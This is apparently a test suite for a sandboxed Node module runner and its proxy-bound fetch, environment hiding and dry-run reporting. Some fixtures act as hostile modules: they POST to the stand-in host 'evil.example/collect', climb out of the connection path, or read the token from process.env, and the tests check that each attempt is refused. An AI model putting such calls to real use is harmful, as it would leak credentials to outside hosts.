/* biome-ignore-all lint/suspicious/noTemplateCurlyInString: the fixtures are module source text, and a template placeholder inside a plain string is exactly what a module holds. */
import { spawn } from "node:child_process";
import { mkdir, mkdtemp, readFile, stat, writeFile } from "node:fs/promises";
import { createServer, type IncomingHttpHeaders, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { afterAll, beforeAll, describe, expect, it } from "vitest";

import {
  DRY_RUN_HEADER,
  DRY_RUN_INTERCEPTED,
  MODULE_ENTRIES,
  RESULT_MARKER,
  RUNNER_SOURCE_PATH,
} from "./runner-source";

/**
 * The runner, as a child process.
 *
 * Real Node against the real `runner.mjs`, with fixture modules in a temporary directory and a fake
 * proxy on a loopback port. The properties asserted are the contract's: what stdout carries, which
 * exit code each failure takes, what `ctx` carries, and that the environment a module could print is
 * not there to print. The proxy binding is exercised end to end against the real proxy in its own
 * package; here the fake records what arrived.
 */

const RUNNER = fileURLToPath(new URL("./runner.mjs", import.meta.url));

type Run = { code: number | null; stdout: string; stderr: string };

function runRunner(args: {
  module: string;
  stdin?: string;
  env?: Record<string, string>;
}): Promise<Run> {
  return new Promise((resolve, reject) => {
    const child = spawn(process.execPath, [RUNNER, args.module], {
      // A clean environment, so a developer's own `HTTPS_PROXY` or `NODE_OPTIONS` cannot leak in.
      env: { PATH: process.env.PATH ?? "", ...args.env },
      stdio: ["pipe", "pipe", "pipe"],
    });
    let stdout = "";
    let stderr = "";
    child.stdout.on("data", (chunk: Buffer) => {
      stdout += chunk.toString();
    });
    child.stderr.on("data", (chunk: Buffer) => {
      stderr += chunk.toString();
    });
    child.on("error", reject);
    child.on("close", (code) => resolve({ code, stdout, stderr }));
    child.stdin.end(args.stdin ?? "");
  });
}

const FIXTURES: Record<string, string> = {
  "echo.mjs": "export default async (input) => ({ echoed: input });",
  "helper.mjs": "export const double = (n) => n * 2;",
  "sibling.mjs":
    'import { double } from "./helper.mjs";\nexport default async (input) => double(input.n);',
  "throws.mjs":
    'export default async () => { throw new Error("kaboom: the line items are missing"); };',
  // undici's shape for a connection that never opened: a bare TypeError over an errno in `cause`.
  "throwsWithCause.mjs": [
    "export default async () => {",
    '  const errno = Object.assign(new Error("getaddrinfo ENOTFOUND customer-api.example"), { code: "ENOTFOUND" });',
    '  throw new TypeError("fetch failed", { cause: errno });',
    "};",
  ].join("\n"),
  "redirected.mjs": [
    "export default async (_input, ctx) => {",
    '  const res = await ctx.fetch("/redirected");',
    '  return { status: res.status, location: res.headers.get("location") };',
    "};",
  ].join("\n"),
  "hangs.mjs": "export default () => new Promise(() => {});",
  "notAFunction.mjs": "export default 42;",
  "leaks.mjs": [
    "export default async (_input, ctx) => ({",
    "  token: process.env.GRAFT_TOKEN ?? null,",
    '  graftEnv: Object.keys(process.env).filter((k) => k.startsWith("GRAFT_")).sort(),',
    "  ctxKeys: Object.keys(ctx).sort(),",
    "  proxyKey: ctx.proxyKey,",
    "});",
  ].join("\n"),
  // What a module sees of the exec's environment, at import time and again at call time.
  "envAtImport.mjs": [
    'const atImport = Object.keys(process.env).filter((k) => k.startsWith("GRAFT_")).sort();',
    "export default async () => ({",
    "  atImport,",
    '  atCall: Object.keys(process.env).filter((k) => k.startsWith("GRAFT_")).sort(),',
    "});",
  ].join("\n"),
  "fetches.mjs": [
    "export default async (input, ctx) => {",
    '  const res = await ctx.fetch("/v1/orders?x=1", {',
    '    method: "POST",',
    '    headers: { "content-type": "application/json" },',
    "    body: JSON.stringify(input),",
    "  });",
    "  return { status: res.status, body: await res.json(), connection: ctx.connection };",
    "};",
  ].join("\n"),
  "escapes.mjs": [
    "export default async (input, ctx) => {",
    "  try {",
    "    await ctx.fetch(input.path);",
    '    return "reached";',
    "  } catch (error) {",
    "    return { refused: error.message };",
    "  }",
    "};",
  ].join("\n"),
  // ADR 0010: the base an SDK is pointed at, for the primary host and for a declared one.
  "proxyBase.mjs": [
    "export default async (input, ctx) => {",
    "  try {",
    "    return {",
    "      primary: ctx.proxyBase(),",
    "      host: ctx.proxyBase(input.host),",
    "      frozen: Object.isFrozen(ctx),",
    "    };",
    "  } catch (error) {",
    "    return { refused: error.message };",
    "  }",
    "};",
  ].join("\n"),
  // An SDK stand-in: the base and key off ctx, then a request the SDK would make with them.
  "sdk.mjs": [
    "export default async (_input, ctx) => {",
    '  const res = await fetch(`${ctx.proxyBase("api.example.com")}/v2/things`, {',
    "    headers: { authorization: `Bearer ${ctx.proxyKey}` },",
    "  });",
    "  return { status: res.status, body: await res.json() };",
    "};",
  ].join("\n"),
  // The dry-run fixtures: a read, then a write handled off whatever came back.
  "dryReadOnly.mjs": [
    "export default async (_input, ctx) => {",
    '  const res = await ctx.fetch("/items?limit=2");',
    "  return { status: res.status, items: await res.json() };",
    "};",
  ].join("\n"),
  "dryWrite.mjs": [
    "export default async (input, ctx) => {",
    '  const read = await ctx.fetch("/items");',
    '  const write = await ctx.fetch("/orders", {',
    '    method: "POST",',
    '    headers: { "content-type": "application/json", "x-idempotency": "k1" },',
    "    body: JSON.stringify(input),",
    "  });",
    "  return { read: read.status, write: write.status, answer: await write.json() };",
    "};",
  ].join("\n"),
  "dryWriteThrows.mjs": [
    "export default async (input, ctx) => {",
    '  await ctx.fetch("/items");',
    '  const write = await ctx.fetch("/orders", { method: "POST", body: JSON.stringify(input) });',
    "  const created = await write.json();",
    '  if (!created.id) throw new Error("the vendor returned no order id");',
    "  return created.id;",
    "};",
  ].join("\n"),
  "dryThrowsFirst.mjs": [
    "export default async () => {",
    '  throw new Error("cannot build the request: input.lines is undefined");',
    "};",
  ].join("\n"),
  "dryReadFails.mjs": [
    "export default async (_input, ctx) => {",
    '  const res = await ctx.fetch("/missing");',
    "  return { status: res.status };",
    "};",
  ].join("\n"),
  "dryWriteRefused.mjs": [
    "export default async (_input, ctx) => {",
    "  try {",
    '    await ctx.fetch("https://evil.example/collect", { method: "POST", body: "x" });',
    "  } catch (error) {",
    '    const res = await ctx.fetch("/orders", { method: "DELETE" });',
    "    return { caught: error.message, status: res.status };",
    "  }",
    "};",
  ].join("\n"),
  // The TypeScript contract. Erasable syntax only — annotations, an interface, a generic, a
  // `satisfies`, a type-only import — and a `.ts` sibling imported with its extension, as Node needs.
  "typed/index.ts": [
    'import type { Line } from "./lines.ts";',
    'import { total } from "./lines.ts";',
    "interface Input { customer: string; lines: Line[] }",
    "type Context = { fetch(path: string, init?: unknown): Promise<unknown> };",
    "const first = <T,>(items: readonly T[]): T | undefined => items[0];",
    "export default async (input: Input, _ctx: Context): Promise<{ customer: string; total: number; first: string | null }> => ({",
    "  customer: input.customer,",
    "  total: total(input.lines),",
    "  first: first(input.lines)?.sku ?? null,",
    "} satisfies { customer: string; total: number; first: string | null });",
  ].join("\n"),
  "typed/lines.ts": [
    "export type Line = { sku: string; qty: number };",
    "export const total = (lines: readonly Line[]): number => lines.reduce((sum, line) => sum + line.qty, 0);",
  ].join("\n"),
  // A directory holding only the second entry still runs.
  "legacy/index.mjs": "export default async (input) => ({ legacy: true, ...input });",
  // What the check refuses ahead of time, and why: Node cannot strip it.
  "enumerated/index.ts": "enum Status { Open }\nexport default async () => Status.Open;",
};

let fixtures: string;
let server: Server;
let proxyUrl: string;
const received: {
  method: string | undefined;
  url: string | undefined;
  headers: IncomingHttpHeaders;
  body: string;
}[] = [];

beforeAll(async () => {
  fixtures = await mkdtemp(join(tmpdir(), "runner-"));
  await Promise.all(
    Object.entries(FIXTURES).map(async ([name, source]) => {
      await mkdir(dirname(join(fixtures, name)), { recursive: true });
      await writeFile(join(fixtures, name), source, "utf8");
    }),
  );

  server = createServer((req, res) => {
    let body = "";
    req.on("data", (chunk: Buffer) => {
      body += chunk.toString();
    });
    req.on("end", () => {
      received.push({ method: req.method, url: req.url, headers: req.headers, body });
      res.setHeader("content-type", "application/json");
      const method = (req.method ?? "GET").toUpperCase();
      const token = req.headers.authorization ?? "";
      const vendorPath = (req.url ?? "/").replace(/^\/c\/[^/]+(\/h\/[^/]+)?/, "") || "/";
      const [path, query] = vendorPath.split("?");
      const isRead = method === "GET" || method === "HEAD";
      // The real proxy hands a vendor's 3xx back unfollowed, `Location` intact (redirects.ts).
      if (path === "/redirected") {
        if (token === `Bearer ${DRY_TOKEN}`) res.setHeader(DRY_RUN_HEADER, "forwarded");
        res.statusCode = 303;
        res.setHeader("location", "https://elsewhere.example/moved");
        res.end();
        return;
      }
      // The real proxy's dry-run answers: a read forwarded and marked; a write stopped with a
      // preview — the header *names* only, never values — on a distinct 2xx.
      if (token === `Bearer ${DRY_TOKEN}` || token === `Bearer ${DRY_REFUSING_TOKEN}`) {
        if (isRead) {
          res.setHeader(DRY_RUN_HEADER, "forwarded");
          if (path === "/missing") {
            res.statusCode = 404;
            res.end(JSON.stringify({ error: "not_found" }));
            return;
          }
          res.end(JSON.stringify({ path: req.url, items: ["a", "b"] }));
          return;
        }
        if (token === `Bearer ${DRY_REFUSING_TOKEN}`) {
          res.statusCode = 403;
          res.end(JSON.stringify({ error: "forbidden", reason: "connection_mismatch" }));
          return;
        }
        res.statusCode = 202;
        res.setHeader(DRY_RUN_HEADER, DRY_RUN_INTERCEPTED);
        res.end(
          JSON.stringify({
            dryRun: true,
            intercepted: true,
            request: {
              method,
              path,
              hasQuery: query !== undefined,
              headerNames: Object.keys(req.headers)
                .filter((name) => name !== "authorization")
                .sort(),
              bodyBytes: Buffer.byteLength(body),
              body,
              bodyEncoding: "utf-8",
            },
          }),
        );
        return;
      }
      res.end(JSON.stringify({ path: req.url }));
    });
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", () => resolve()));
  proxyUrl = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
});

afterAll(async () => {
  await new Promise<void>((resolve) => server.close(() => resolve()));
});

const fixture = (name: string) => join(fixtures, name);

const bound = () => ({
  GRAFT_PROXY_URL: proxyUrl,
  GRAFT_CONNECTION: "conn_1",
  GRAFT_TOKEN: "tok_secret_123",
});

/** The fake proxy reads the dry-run claim off the bearer token, as the real one does. */
const DRY_TOKEN = "tok_dry_run";
/** A dry-run token the fake proxy refuses every write on — another connection's, say. */
const DRY_REFUSING_TOKEN = "tok_dry_refused";

const dry = (token = DRY_TOKEN) => ({ ...bound(), GRAFT_TOKEN: token, GRAFT_DRY_RUN: "1" });

type DryRunReport = {
  dryRun: true;
  passed: boolean;
  reads: { method: string; path: string; status: number }[];
  writesPreviewed: { method: string; path: string; headerNames: string[]; body: string | null }[];
  writesRefused: { method: string; path: string; status: number | null; error: string | null }[];
  moduleResult?: unknown;
  moduleError?: string;
  verified: { reads: boolean; writeRequests: boolean };
  unverified: string[];
};

describe("the stdout contract", () => {
  it("parses stdin, calls the default export and prints exactly the JSON result", async () => {
    const run = await runRunner({ module: fixture("echo.mjs"), stdin: '{"a": 1, "b": [true]}' });

    expect(run.code).toBe(0);
    expect(run.stderr).toBe("");
    expect(JSON.parse(run.stdout)).toEqual({ echoed: { a: 1, b: [true] } });
    // Nothing but the JSON — a caller parses stdout whole.
    expect(run.stdout).toBe(JSON.stringify({ echoed: { a: 1, b: [true] } }));
  });

  it("treats empty stdin as an empty input object", async () => {
    const run = await runRunner({ module: fixture("echo.mjs") });

    expect(run.code).toBe(0);
    expect(JSON.parse(run.stdout)).toEqual({ echoed: {} });
  });

  /** The module contract allows sibling imports, so a tool can keep a helper beside its entry. */
  it("lets a module import a sibling", async () => {
    const run = await runRunner({ module: fixture("sibling.mjs"), stdin: '{"n": 21}' });

    expect(run.code).toBe(0);
    expect(JSON.parse(run.stdout)).toBe(42);
  });
});

/**
 * The contract is TypeScript, run by Node 24's own type stripping, and the runner takes the module's
 * directory — resolving `index.ts` first, `index.mjs` second — so a record can point at a version
 * directory without knowing which entry it holds.
 */
describe("a TypeScript module", () => {
  it("runs a .ts entry with erasable syntax and a .ts sibling, given the directory", async () => {
    const run = await runRunner({
      module: fixture("typed"),
      stdin: JSON.stringify({
        customer: "ACME",
        lines: [
          { sku: "A", qty: 2 },
          { sku: "B", qty: 3 },
        ],
      }),
    });

    expect(run.stderr).toBe("");
    expect(run.code).toBe(0);
    expect(JSON.parse(run.stdout)).toEqual({ customer: "ACME", total: 5, first: "A" });
  });

  it("runs the .ts entry given as a file, too", async () => {
    const run = await runRunner({
      module: fixture("typed/index.ts"),
      stdin: JSON.stringify({ customer: "ACME", lines: [] }),
    });

    expect(run.code).toBe(0);
    expect(JSON.parse(run.stdout)).toEqual({ customer: "ACME", total: 0, first: null });
  });

  it("falls back to index.mjs when a directory holds no index.ts", async () => {
    const run = await runRunner({ module: fixture("legacy"), stdin: '{"n": 1}' });

    expect(run.code).toBe(0);
    expect(JSON.parse(run.stdout)).toEqual({ legacy: true, n: 1 });
  });

  /** The reason the check refuses non-erasable syntax: here is what happens without it. */
  it("cannot load an enum, and says so on stderr with exit 1", async () => {
    const run = await runRunner({ module: fixture("enumerated") });

    expect(run.code).toBe(1);
    expect(run.stdout).toBe("");
    expect(run.stderr).toContain("ERR_UNSUPPORTED_TYPESCRIPT_SYNTAX");
  });

  it("exits 64 for a directory holding neither entry", async () => {
    const run = await runRunner({ module: fixtures });

    expect(run.code).toBe(64);
    expect(run.stderr).toContain("index.ts or index.mjs");
  });

  /** The runner ships to the sandbox alone, so it carries its own copy of the entry list. */
  it("resolves the same entries, in the same order, as runner-source.ts declares", async () => {
    const source = await readFile(RUNNER, "utf8");
    const declared = /const ENTRIES = (\[[^\]]*\]);/.exec(source)?.[1] ?? "[]";
    expect(JSON.parse(declared)).toEqual([...MODULE_ENTRIES]);
  });

  /** Likewise the dry-run header and the result marker: one artefact, two holders of each name. */
  it("names the dry-run header and the result marker runner-source.ts declares", async () => {
    const source = await readFile(RUNNER, "utf8");
    expect(source).toContain(`const DRY_RUN_HEADER = ${JSON.stringify(DRY_RUN_HEADER)};`);
    expect(source).toContain(`const DRY_RUN_INTERCEPTED = ${JSON.stringify(DRY_RUN_INTERCEPTED)};`);
    expect(source).toContain(`const RESULT_MARKER = ${JSON.stringify(RESULT_MARKER)};`);
  });
});

describe("failures, each with its own exit code", () => {
  it("exits 1 with the error on stderr when the module throws, and prints no result", async () => {
    const run = await runRunner({ module: fixture("throws.mjs") });

    expect(run.code).toBe(1);
    expect(run.stdout).toBe("");
    expect(run.stderr).toContain("kaboom: the line items are missing");
  });

  it("prints each cause after the stack, so a fetch that never connected names its host", async () => {
    const run = await runRunner({ module: fixture("throwsWithCause.mjs") });

    expect(run.code).toBe(1);
    expect(run.stdout).toBe("");
    expect(run.stderr).toContain("TypeError: fetch failed");
    expect(run.stderr).toContain(
      "caused by: Error [ENOTFOUND]: getaddrinfo ENOTFOUND customer-api.example",
    );
    // The chain follows the stack, so the tail `fail` keeps ends in the cause.
    expect(run.stderr.indexOf("caused by:")).toBeGreaterThan(run.stderr.indexOf("fetch failed"));
  });

  it("exits 1 when the default export is not a function", async () => {
    const run = await runRunner({ module: fixture("notAFunction.mjs") });

    expect(run.code).toBe(1);
    expect(run.stderr).toContain("must export a default function");
  });

  /** Distinct from a throw, so a caller can tell slow from wrong. */
  it("exits 2 with a distinct message when the module does not settle within GRAFT_TIMEOUT_MS", async () => {
    const run = await runRunner({
      module: fixture("hangs.mjs"),
      env: { GRAFT_TIMEOUT_MS: "200" },
    });

    expect(run.code).toBe(2);
    expect(run.stdout).toBe("");
    expect(run.stderr).toContain("Timed out after 200ms");
  });

  it("exits 64 when invoked without a module path", async () => {
    const run = await runRunner({ module: "" });

    expect(run.code).toBe(64);
    expect(run.stderr).toContain("usage:");
  });

  it("exits 64 when stdin is not JSON", async () => {
    const run = await runRunner({ module: fixture("echo.mjs"), stdin: "not json" });

    expect(run.code).toBe(64);
    expect(run.stderr).toContain("stdin is not JSON");
  });
});

describe("the exec's environment stays out of the module's reach", () => {
  /**
   * The module gets a `ctx` and nothing that *is* the environment. The environment is what a module
   * would print, so that is what is asserted — every `GRAFT_*` variable, not the token alone. The
   * token itself is on `ctx.proxyKey` by decision (ADR 0010, amended): an SDK needs a credential
   * slot filled, and the proxy swaps this one for the real credential.
   */
  it("is deleted from process.env before the module loads, and ctx carries exactly four names", async () => {
    const run = await runRunner({ module: fixture("leaks.mjs"), env: bound() });

    expect(run.code).toBe(0);
    expect(JSON.parse(run.stdout)).toEqual({
      token: null,
      graftEnv: [],
      ctxKeys: ["connection", "fetch", "proxyBase", "proxyKey"],
      proxyKey: "tok_secret_123",
    });
  });

  /** Every variable the runner reads, set at once; none of them visible at import time or at call time. */
  it("hides every GRAFT_* variable the runner consumed, at import time and at call time", async () => {
    const resultPath = join(fixtures, "results", "env.result.json");
    const run = await runRunner({
      module: fixture("envAtImport.mjs"),
      env: { ...dry(), GRAFT_RESULT_PATH: resultPath, GRAFT_TIMEOUT_MS: "5000" },
    });

    expect(run.code).toBe(0);
    expect(run.stderr).toBe("");
    // The variables still did their work before they went: this was a dry run, written to the file.
    expect(run.stdout).toBe(`${RESULT_MARKER}${resultPath}\n`);
    const report = JSON.parse(await readFile(resultPath, "utf8")) as DryRunReport;
    expect(report.dryRun).toBe(true);
    expect(report.moduleResult).toEqual({ atImport: [], atCall: [] });
  });
});

describe("ctx.fetch", () => {
  it("prepends the proxy URL and connection to a vendor-relative path and adds the bearer token", async () => {
    const before = received.length;
    const run = await runRunner({
      module: fixture("fetches.mjs"),
      stdin: '{"orderId": 7}',
      env: bound(),
    });

    expect(run.code).toBe(0);
    expect(JSON.parse(run.stdout)).toEqual({
      status: 200,
      body: { path: "/c/conn_1/v1/orders?x=1" },
      connection: "conn_1",
    });
    const request = received[before];
    expect(request?.method).toBe("POST");
    expect(request?.url).toBe("/c/conn_1/v1/orders?x=1");
    expect(request?.headers.authorization).toBe("Bearer tok_secret_123");
    expect(request?.headers["content-type"]).toBe("application/json");
    expect(request?.body).toBe('{"orderId":7}');
  });

  /** The proxy returned the redirect on purpose; the sandbox can reach nothing but the proxy. */
  it("does not follow a redirect: the proxy's 303 reaches the module as a status, and no second request is made", async () => {
    const before = received.length;
    const run = await runRunner({ module: fixture("redirected.mjs"), env: bound() });

    expect(run.code).toBe(0);
    expect(JSON.parse(run.stdout)).toEqual({
      status: 303,
      location: "https://elsewhere.example/moved",
    });
    expect(received.length).toBe(before + 1);
    expect(received[before]?.url).toBe("/c/conn_1/redirected");
  });

  /** The token must never travel to a host the module chose. */
  it("refuses an absolute URL without making a request", async () => {
    const before = received.length;
    const run = await runRunner({
      module: fixture("escapes.mjs"),
      stdin: JSON.stringify({ path: "https://evil.example/collect" }),
      env: bound(),
    });

    expect(run.code).toBe(0);
    expect(JSON.parse(run.stdout)).toEqual({
      refused: expect.stringContaining("not an absolute URL"),
    });
    expect(received).toHaveLength(before);
  });

  /** Nor for a connection the token was not minted for. */
  it("refuses a path that climbs out of the connection", async () => {
    const before = received.length;
    const run = await runRunner({
      module: fixture("escapes.mjs"),
      stdin: JSON.stringify({ path: "../conn_2/v1/orders" }),
      env: bound(),
    });

    expect(JSON.parse(run.stdout)).toEqual({
      refused: expect.stringContaining("leaves the connection"),
    });
    expect(received).toHaveLength(before);
  });

  /** A plain command carries no connection; a module that reaches for one is told so. */
  it("throws a clear error when no connection is bound", async () => {
    const run = await runRunner({
      module: fixture("escapes.mjs"),
      stdin: JSON.stringify({ path: "/v1/orders" }),
    });

    expect(run.code).toBe(0);
    expect(JSON.parse(run.stdout)).toEqual({
      refused: expect.stringContaining("no connection bound"),
    });
  });
});

/**
 * `ctx.proxyBase(host?)` — ADR 0010. The primary form is the prefix `ctx.fetch` builds under; the
 * `/h/<host>` form is the proxy's multi-host route for a host the connection declares. The runner
 * only builds the address: which hosts are allowed is the proxy's to decide.
 */
describe("ctx.proxyBase", () => {
  it("returns the connection's base without a host and the /h/ form with one, on a frozen ctx", async () => {
    const run = await runRunner({
      module: fixture("proxyBase.mjs"),
      stdin: JSON.stringify({ host: "api.example.com" }),
      env: bound(),
    });

    expect(run.code).toBe(0);
    expect(JSON.parse(run.stdout)).toEqual({
      primary: `${proxyUrl}/c/conn_1`,
      host: `${proxyUrl}/c/conn_1/h/api.example.com`,
      frozen: true,
    });
  });

  it("tolerates a proxy URL with a path and a trailing slash", async () => {
    const run = await runRunner({
      module: fixture("proxyBase.mjs"),
      stdin: JSON.stringify({ host: "graph.microsoft.com:443" }),
      env: { ...bound(), GRAFT_PROXY_URL: `${proxyUrl}/api/proxy/` },
    });

    expect(JSON.parse(run.stdout)).toEqual({
      primary: `${proxyUrl}/api/proxy/c/conn_1`,
      host: `${proxyUrl}/api/proxy/c/conn_1/h/graph.microsoft.com:443`,
      frozen: true,
    });
  });

  /** A host is a path segment on the proxy; anything that could be a path is refused before it becomes one. */
  it.each(["api.example.com/../../other", "https://api.example.com", "a b", "", "-x.example"])(
    "refuses %j as a host",
    async (host) => {
      const run = await runRunner({
        module: fixture("proxyBase.mjs"),
        stdin: JSON.stringify({ host }),
        env: bound(),
      });

      expect(JSON.parse(run.stdout)).toEqual({
        refused: expect.stringContaining("ctx.proxyBase takes a host name"),
      });
    },
  );

  it("is unavailable when no connection is bound, in the same words as ctx.fetch", async () => {
    const run = await runRunner({
      module: fixture("proxyBase.mjs"),
      stdin: JSON.stringify({ host: "api.example.com" }),
    });

    expect(JSON.parse(run.stdout)).toEqual({
      refused: expect.stringContaining("ctx.proxyBase is unavailable"),
    });
  });

  /** What an SDK does with the two: the request lands on the proxy, under the host segment, with the token. */
  it("carries an SDK's request to the proxy under /h/<host> with proxyKey as the bearer", async () => {
    const before = received.length;
    const run = await runRunner({ module: fixture("sdk.mjs"), env: bound() });

    expect(run.code).toBe(0);
    expect(JSON.parse(run.stdout)).toEqual({
      status: 200,
      body: { path: "/c/conn_1/h/api.example.com/v2/things" },
    });
    const request = received[before];
    expect(request?.url).toBe("/c/conn_1/h/api.example.com/v2/things");
    expect(request?.headers.authorization).toBe("Bearer tok_secret_123");
  });
});

/** The seeding side reads the same file this suite spawns. */
it("is the file provisioning seeds", () => {
  expect(RUNNER_SOURCE_PATH).toBe(RUNNER);
});

/**
 * The detached path. With `GRAFT_RESULT_PATH` set the result goes to a file the caller reads once the
 * process record says it has finished, and stdout says only where it went.
 */
describe("GRAFT_RESULT_PATH", () => {
  it("writes the result to the file whole, prints only the marker on stdout, and leaves no temporary file", async () => {
    const resultPath = join(fixtures, "results", "nested", "cmd-abc.result.json");

    const run = await runRunner({
      module: fixture("echo.mjs"),
      stdin: '{"n": 1}',
      env: { GRAFT_RESULT_PATH: resultPath },
    });

    expect(run.code).toBe(0);
    expect(run.stderr).toBe("");
    expect(run.stdout).toBe(`${RESULT_MARKER}${resultPath}\n`);
    expect(JSON.parse(await readFile(resultPath, "utf8"))).toEqual({ echoed: { n: 1 } });
    await expect(stat(`${resultPath}.tmp`)).rejects.toThrow();
  });

  it("writes no result file when the module throws, and fails as before", async () => {
    const resultPath = join(fixtures, "throws.result.json");

    const run = await runRunner({
      module: fixture("throws.mjs"),
      env: { GRAFT_RESULT_PATH: resultPath },
    });

    expect(run.code).toBe(1);
    expect(run.stdout).toBe("");
    expect(run.stderr).toContain("kaboom");
    await expect(stat(resultPath)).rejects.toThrow();
  });
});

/**
 * Dry-run mode. `GRAFT_DRY_RUN=1` with a token the proxy reads the claim off: reads pass through to
 * the fake and come back real, a write comes back as the proxy's preview and the module runs on
 * against it, and what stdout carries is the report — verified apart from unverified, and `passed`
 * decided on the preview rather than on what the module did after it.
 */
describe("GRAFT_DRY_RUN", () => {
  const report = (run: Run): DryRunReport => JSON.parse(run.stdout) as DryRunReport;

  it("passes a read-only module on its real responses, with nothing unverified", async () => {
    const run = await runRunner({ module: fixture("dryReadOnly.mjs"), env: dry() });

    expect(run.code).toBe(0);
    expect(run.stderr).toBe("");
    expect(report(run)).toEqual({
      dryRun: true,
      passed: true,
      reads: [{ method: "GET", path: "/items?limit=2", status: 200 }],
      writesPreviewed: [],
      writesRefused: [],
      moduleResult: { status: 200, items: { path: "/c/conn_1/items?limit=2", items: ["a", "b"] } },
      verified: { reads: true, writeRequests: true },
      unverified: [],
    });
  });

  it("hands the module the proxy's preview as the response, records it, and marks post-write handling unverified", async () => {
    const before = received.length;
    const run = await runRunner({
      module: fixture("dryWrite.mjs"),
      stdin: '{"itemId":"itm_a","quantity":2}',
      env: dry(),
    });

    expect(run.code).toBe(0);
    const result = report(run);
    expect(result.passed).toBe(true);
    expect(result.reads).toEqual([{ method: "GET", path: "/items", status: 200 }]);
    // The proxy's own account of the write: header names, never values; the body as it would have left.
    expect(result.writesPreviewed).toEqual([
      {
        method: "POST",
        path: "/orders",
        headerNames: expect.arrayContaining(["content-type", "x-idempotency"]),
        body: '{"itemId":"itm_a","quantity":2}',
      },
    ]);
    expect(result.writesPreviewed[0]?.headerNames).not.toContain("authorization");
    expect(result.writesRefused).toEqual([]);
    // The module saw exactly what the proxy answered — the 202 and the preview body — unchanged.
    expect(result.moduleResult).toMatchObject({
      read: 200,
      write: 202,
      answer: { dryRun: true, intercepted: true, request: { method: "POST", path: "/orders" } },
    });
    expect(result.verified).toEqual({ reads: true, writeRequests: true });
    expect(result.unverified).toEqual(["post-write handling"]);
    // The write reached the proxy — and the proxy, not the vendor, answered it.
    const write = received.slice(before).find((request) => request.method === "POST");
    expect(write?.url).toBe("/c/conn_1/orders");
    expect(write?.headers.authorization).toBe(`Bearer ${DRY_TOKEN}`);
  });

  /** A module that throws *after* the intercepted write still passes on the preview. */
  it("still passes a module that throws after an intercepted write, reporting the error unverified", async () => {
    const run = await runRunner({
      module: fixture("dryWriteThrows.mjs"),
      stdin: '{"itemId":"itm_a"}',
      env: dry(),
    });

    expect(run.code).toBe(0);
    expect(run.stderr).toBe("");
    const result = report(run);
    expect(result.passed).toBe(true);
    expect(result.writesPreviewed).toHaveLength(1);
    expect(result.moduleError).toContain("the vendor returned no order id");
    expect(result).not.toHaveProperty("moduleResult");
    expect(result.unverified).toEqual(["post-write handling"]);
  });

  /** A throw with no write intercepted is the module failing on its own, and the report says so. */
  it("fails a module that throws before any write, and exits 0 with the report", async () => {
    const run = await runRunner({ module: fixture("dryThrowsFirst.mjs"), env: dry() });

    expect(run.code).toBe(0);
    const result = report(run);
    expect(result.passed).toBe(false);
    expect(result.moduleError).toContain("input.lines is undefined");
    expect(result.reads).toEqual([]);
    expect(result.writesPreviewed).toEqual([]);
    expect(result.unverified).toEqual([]);
  });

  it("fails on a read the vendor refused, and says which", async () => {
    const run = await runRunner({ module: fixture("dryReadFails.mjs"), env: dry() });

    const result = report(run);
    expect(result.passed).toBe(false);
    expect(result.reads).toEqual([{ method: "GET", path: "/missing", status: 404 }]);
    expect(result.verified).toEqual({ reads: false, writeRequests: true });
    expect(result.moduleResult).toEqual({ status: 404 });
  });

  it("records a redirected read with its status rather than a thrown run", async () => {
    const run = await runRunner({ module: fixture("redirected.mjs"), env: dry() });

    const result = report(run);
    expect(result.passed).toBe(false);
    expect(result.reads).toEqual([{ method: "GET", path: "/redirected", status: 303 }]);
    expect(result.moduleResult).toEqual({
      status: 303,
      location: "https://elsewhere.example/moved",
    });
  });

  /** A write that never became a preview — refused by `ctx.fetch` or by the proxy — is a write request that was not well-formed. */
  it("fails on a write refused before or at the proxy, recording both kinds", async () => {
    const run = await runRunner({
      module: fixture("dryWriteRefused.mjs"),
      env: dry(DRY_REFUSING_TOKEN),
    });

    const result = report(run);
    expect(result.passed).toBe(false);
    expect(result.writesRefused).toEqual([
      {
        method: "POST",
        path: "https://evil.example/collect",
        status: null,
        error: expect.stringContaining("not an absolute URL"),
      },
      { method: "DELETE", path: "/orders", status: 403, error: null },
    ]);
    expect(result.writesPreviewed).toEqual([]);
    expect(result.verified).toEqual({ reads: true, writeRequests: false });
    expect(result.unverified).toEqual([]);
  });

  it("writes the report to the result file on the detached path", async () => {
    const resultPath = join(fixtures, "results", "dry.result.json");
    const run = await runRunner({
      module: fixture("dryWrite.mjs"),
      stdin: '{"n":1}',
      env: { ...dry(), GRAFT_RESULT_PATH: resultPath },
    });

    expect(run.code).toBe(0);
    expect(run.stdout).toBe(`${RESULT_MARKER}${resultPath}\n`);
    const written = JSON.parse(await readFile(resultPath, "utf8")) as DryRunReport;
    expect(written.dryRun).toBe(true);
    expect(written.passed).toBe(true);
    expect(written.writesPreviewed[0]?.body).toBe('{"n":1}');
  });

  /** Without the variable nothing changes: the same write reaches the fake as a plain call and the result is the module's. */
  it("is off without GRAFT_DRY_RUN, whatever the token", async () => {
    const run = await runRunner({
      module: fixture("dryWrite.mjs"),
      stdin: '{"n":1}',
      env: { ...bound(), GRAFT_TOKEN: DRY_TOKEN },
    });

    expect(run.code).toBe(0);
    const result = JSON.parse(run.stdout) as Record<string, unknown>;
    expect(result).not.toHaveProperty("dryRun");
    expect(result).toMatchObject({ read: 200, write: 202 });
  });
});
